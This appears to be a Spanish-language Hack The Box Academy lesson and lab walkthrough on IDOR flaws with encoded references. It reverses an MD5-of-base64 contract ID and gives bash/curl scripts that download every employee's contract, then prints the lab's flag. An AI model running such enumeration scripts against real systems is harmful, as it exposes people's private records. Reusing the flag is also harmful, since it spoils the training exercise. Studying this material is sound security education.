
# Bypass de referencias codificadas

En la sección anterior, vimos un ejemplo de un IDOR que utiliza identificadores de usuario de empleados en texto sin formato, lo que facilita la enumeración. En algunos casos, las aplicaciones web crean hashes o codifican sus referencias de objetos, lo que dificulta la enumeración, pero aún puede ser posible.

Regresemos a la aplicación `Employee Manager` para probar la funcionalidad `Contracts`:  &#x20;

<figure><img src="https://academy.hackthebox.com/storage/modules/134/web_attacks_idor_contracts.jpg" alt=""><figcaption></figcaption></figure>

Si hacemos clic en el archivo `Employment_contract.pdf`, comienza la descarga del mismo. La solicitud interceptada en Burp tiene el siguiente aspecto:

![descargar\_contrato](https://academy.hackthebox.com/storage/modules/134/web_attacks_idor_download_contract.jpg)

Vemos que está enviando una solicitud `POST` a `download.php` con los siguientes datos:

```php
contract=cdd96d3cc73d1dbdaffa03cc6cd7339b
```

El uso de un script `download.php` para descargar archivos es una práctica habitual para evitar vincular directamente a los archivos, ya que esto puede ser explotable con múltiples ataques web. En este caso, la aplicación web no envía la referencia directa en texto sin formato, sino que parece estar creando un hash en un formato `md5`. Los hashes son funciones unidireccionales, por lo que no podemos decodificarlos para ver sus valores originales.

Podemos intentar hacer un hash de varios valores, como `uid`, `username`, `filename`, y muchos otros, y ver si alguno de sus hashes `md5` coincide con el valor anterior. Si encontramos una coincidencia, podemos replicarla para otros usuarios y recopilar sus archivos. Por ejemplo, intentemos comparar el hash `md5` de nuestro `uid`, y veamos si coincide con el hash anterior:

```shell-session
afsh4ck@kali$ echo -n 1 | md5sum

c4ca4238a0b923820dcc509a6f75849b -
```

Lamentablemente, los hashes no coinciden. Podemos intentar esto con varios otros campos, pero ninguno de ellos coincide con nuestro hash. En casos avanzados, también podemos utilizar `Burp Comparer` y realizar pruebas de fuzzing en varios valores y luego comparar cada uno con nuestro hash para ver si encontramos alguna coincidencia. En este caso, el hash `md5` podría ser para un valor único o una combinación de valores, lo que sería muy difícil de predecir, lo que hace que esta referencia directa sea un `Secure Direct Object Reference`. Sin embargo, hay una falla fatal en esta aplicación web.

***

## <mark style="color:purple;">Divulgación de funciones</mark>

Como la mayoría de las aplicaciones web modernas se desarrollan utilizando marcos de JavaScript, como `Angular`, `React` o `Vue.js`, muchos desarrolladores web pueden cometer el error de realizar funciones sensibles en el front-end, lo que los expondría a los atacantes. Por ejemplo, si el hash anterior se estuviera calculando en el front-end, podemos estudiar la función y luego replicar lo que está haciendo para calcular el mismo hash. Afortunadamente para nosotros, este es precisamente el caso en esta aplicación web.

Si echamos un vistazo al enlace en el código fuente, vemos que está llamando a una función de JavaScript con `javascript:downloadContract('1')`. Si observamos la función `downloadContract()` en el código fuente, vemos lo siguiente:

```javascript
function downloadContract(uid) {
    $.redirect("/download.php", {
        contract: CryptoJS.MD5(btoa(uid)).toString(),
    }, "POST", "_self");
}
```

Esta función parece estar enviando una solicitud `POST` con el parámetro `contract`, que es lo que vimos anteriormente. El valor que está enviando es un hash `md5` que utiliza la biblioteca `CryptoJS`, que también coincide con la solicitud que vimos anteriormente. Por lo tanto, lo único que queda por ver es qué valor se está codificando.

En este caso, el valor que se va a codificar es `btoa(uid)`, que es la cadena codificada en `base64` de la variable `uid`, que es un argumento de entrada para la función. Volviendo al enlace anterior donde se llamó a la función, vemos que llama a `downloadContract('1')`. Por lo tanto, el valor final que se utiliza en la solicitud `POST` es la cadena codificada en `base64` de `1`, que luego se convirtió en un hash `md5`.

Podemos probar esto codificando en `base64` nuestro `uid=1`, y luego aplicándole un hash con `md5`, de la siguiente manera:

```shell-session
afsh4ck@kali$ echo -n 1 | base64 -w 0 | md5sum

cdd96d3cc73d1dbdaffa03cc6cd7339b -
```

{% hint style="info" %}
**Consejo**: Estamos usando la flag `-n` con `echo`, y la flag `-w 0` con `base64`, para evitar agregar nuevas líneas, para poder calcular el `md5`hash del mismo valor, sin hacer hash de nuevas líneas, ya que eso cambiaría el `md5`hash final.
{% endhint %}

Como podemos ver, este hash coincide con el hash de nuestra solicitud, lo que significa que hemos revertido con éxito la técnica de hash utilizada en las referencias de objetos, convirtiéndolas en IDOR. Con eso, podemos comenzar a enumerar los contratos de otros empleados utilizando el mismo método de hash que usamos anteriormente.

***

## <mark style="color:purple;">Enumeración masiva</mark>

Una vez más, escribamos un script bash simple para recuperar todos los contratos de los empleados. En la mayoría de los casos, este es el método más fácil y eficiente para enumerar datos y archivos a través de vulnerabilidades IDOR. En casos más avanzados, podemos utilizar herramientas como `Burp Intruder` o `ZAP Fuzzer`, pero un script bash simple debería ser la mejor opción para nuestro ejercicio.

Podemos comenzar calculando el hash para cada uno de los primeros diez empleados usando el mismo comando anterior `tr -d` pero eliminando los caracteres finales `-` , de la siguiente manera:

```shell-session
afsh4ck@kali$ for i in {1..10}; do echo -n $i | base64 -w 0 | md5sum | tr -d ' -'; done

cdd96d3cc73d1dbdaffa03cc6cd7339b
0b7e7dee87b1c3b98e72131173dfbbbf
0b24df25fe628797b3a50ae0724d2730
f7947d50da7a043693a592b4db43b0a1
8b9af1f7f76daf0f02bd9c48c4a2e3d0
006d1236aee3f92b8322299796ba1989
b523ff8d1ced96cef9c86492e790c2fb
d477819d240e7d3dd9499ed8d23e7158
3e57e65a34ffcb2e93cb545d024f5bde
5d4aace023dc088767b4e08c79415dcd
```

A continuación, podemos realizar una solicitud `POST` a `download.php` con cada uno de los hashes anteriores como valor `contract`, lo que debería darnos nuestro script final:

```bash
#!/bin/bash

for i in {1..10}; do
    for hash in $(echo -n $i | base64 -w 0 | md5sum | tr -d ' -'); do
        curl -sOJ -X POST -d "contract=$hash" http://SERVER_IP:PORT/download.php
    done
done
```

Con esto, podemos ejecutar el script, y debería descargar todos los contratos de los empleados 1 a 10:

```shell-session
afsh4ck@kali$ bash ./exploit.sh
afsh4ck@kali$ ls -1

contract_006d1236aee3f92b8322299796ba1989.pdf
contract_0b24df25fe628797b3a50ae0724d2730.pdf
contract_0b7e7dee87b1c3b98e72131173dfbbbf.pdf
contract_3e57e65a34ffcb2e93cb545d024f5bde.pdf
contract_5d4aace023dc088767b4e08c79415dcd.pdf
contract_8b9af1f7f76daf0f02bd9c48c4a2e3d0.pdf
contract_b523ff8d1ced96cef9c86492e790c2fb.pdf
contract_cdd96d3cc73d1dbdaffa03cc6cd7339b.pdf
contract_d477819d240e7d3dd9499ed8d23e7158.pdf
contract_f7947d50da7a043693a592b4db43b0a1.pdf
```

Como podemos ver, debido a que pudimos revertir la técnica de hashing utilizada en las referencias de objetos, ahora podemos explotar con éxito la vulnerabilidad IDOR para recuperar todos los contratos de los demás usuarios.

***

## <mark style="color:purple;">Caso práctico</mark>

```
Objetivo: 94.237.62.166:56106
```

Intente descargar los contratos de los primeros 20 empleados, uno de los cuales debe contener la flag, que puede leer con 'cat'. Puede calcular el valor del parámetro 'contract' o calcular directamente el nombre del archivo '.pdf'.

<figure><img src="/files/iWyq6uUutyv5PPXXJrq9" alt=""><figcaption></figcaption></figure>

Al abrir el contrato nos lo descarga en local y vemos que tiene un nombre codificado:

<figure><img src="/files/7U8zFcX3Bs0XuCb2uFZE" alt=""><figcaption></figcaption></figure>

Al capturar la petición con BurpSuite vemos que hace una petición GET a `/download.php`:

<figure><img src="/files/JMKp35CiAErUNItCpjRb" alt=""><figcaption></figcaption></figure>

### Calcular hashes

Lo primero vamos a calcular los hashes md5 de los 20 primeros empleados con el siguiente comando:

```bash
for i in {1..20}; do echo -n $i | base64 -w 0 | md5sum | tr -d ' -'; done

cdd96d3cc73d1dbdaffa03cc6cd7339b
0b7e7dee87b1c3b98e72131173dfbbbf
0b24df25fe628797b3a50ae0724d2730
f7947d50da7a043693a592b4db43b0a1
8b9af1f7f76daf0f02bd9c48c4a2e3d0
006d1236aee3f92b8322299796ba1989
b523ff8d1ced96cef9c86492e790c2fb
d477819d240e7d3dd9499ed8d23e7158
3e57e65a34ffcb2e93cb545d024f5bde
5d4aace023dc088767b4e08c79415dcd
07ad04719525444cbd55807a98fcdfd3
7e7175c2e20d590551e9fb500bc38c8c
9017f25f0102aa874e0e69f2b0d2a042
de66190c2119decc6f388a713a66864b
04205a9952e24c3292871ba9f0e2852b
267c5ec9bb11bca880c80728d82abc1b
e86cb34633a953bc68658d74c0c7d47f
9c66278aaeed9f97fecbb61a9ca65998
c15a676ff0dd06e42e91649da2731640
db2bf917c216f7c76f684bfc9d0cf12b
```

### Script de enumeración masiva

Vamos a usar el siguiente script, que es un poco más pro que el que vimos antes en esta sección:

{% code title="idor-enum.sh" %}

```bash
#!/bin/bash

# Mensaje inicial
echo "Iniciando la descarga de contratos..."

# Bucle para generar el valor base64 para cada usuario
for i in {1..20}; do
    # Codificar el uid en base64
    base64_uid=$(echo -n $i | base64 -w 0)
    
    # Mostrar el mensaje de progreso
    echo "Descargando contrato para el empleado UID: $i (base64: $base64_uid)..."

    # Realizar la solicitud GET con el valor base64 y descargar el archivo
    curl -sOJ "http://94.237.62.166:56106/download.php?contract=$base64_uid" && echo "Contrato para el empleado UID: $i descargado correctamente." || echo "Error al descargar el contrato para el empleado UID: $i."
done

# Mensaje final
echo "Descargas completadas."

```

{% endcode %}

```bash
bash idor-enum.sh 

Iniciando la descarga de contratos...
Descargando contrato para el empleado UID: 1 (base64: MQ==)...
Contrato para el empleado UID: 1 descargado correctamente.
Descargando contrato para el empleado UID: 2 (base64: Mg==)...
Contrato para el empleado UID: 2 descargado correctamente.
Descargando contrato para el empleado UID: 3 (base64: Mw==)...
Contrato para el empleado UID: 3 descargado correctamente.
Descargando contrato para el empleado UID: 4 (base64: NA==)...
Contrato para el empleado UID: 4 descargado correctamente.
Descargando contrato para el empleado UID: 5 (base64: NQ==)...
Contrato para el empleado UID: 5 descargado correctamente.
Descargando contrato para el empleado UID: 6 (base64: Ng==)...
```

```bash
ls
 idor-enum.sh         
 contract_1679091c5a880faf6fb5e6087eb1b2dc.pdf  
 contract_1f0e3dad99908345f7439f8ffabdffc4.pdf 
 contract_45c48cce2e2d7fbdea1afc51c7c6ad26.pdf  
 contract_6512bd43d9caa6e02c990b0a82652dca.pdf  
 contract_6f4922f45568161a8cdf4ad2299f6d23.pdf  
 contract_70efdf2ec9b086079795c442636b55fb.pdf  
 contract_8f14e45fceea167a5a36dedd4bea2543.pdf  
 contract_98f13708210194c475687be6106a3b84.pdf  
 contract_9bf31c7ff062936a96d3c8bd1f8f2ff3.pdf  
 contract_a87ff679a2f3e71d9181a67b7542122c.pdf  
 contract_aab3238922bcc25a6f606eb525ffdc56.pdf  
 contract_c20ad4d76fe97759aa27a0c99bff6710.pdf  
 contract_c4ca4238a0b923820dcc509a6f75849b.pdf  
 contract_c51ce410c124a10e0db5e4b97fc2af39.pdf  
 contract_c74d97b01eae257e44aa9d5bade97baf.pdf  
 contract_c81e728d9d4c2f636f067f89cc14862c.pdf  
 contract_c9f0f895fb98ab9159f51fd0297e236d.pdf  
 contract_d3d9446802a44259755d38e6d163e820.pdf  
 contract_e4da3b7fbbce2345d7772b0674a318d5.pdf  
 contract_eccbc87e4b5ce2fe28308fd9f2a7baf3.pdf 
```

```bash
cat *                                        
HTB{h4Sh1nG_1d5_w0n7_S70p_m3}
```
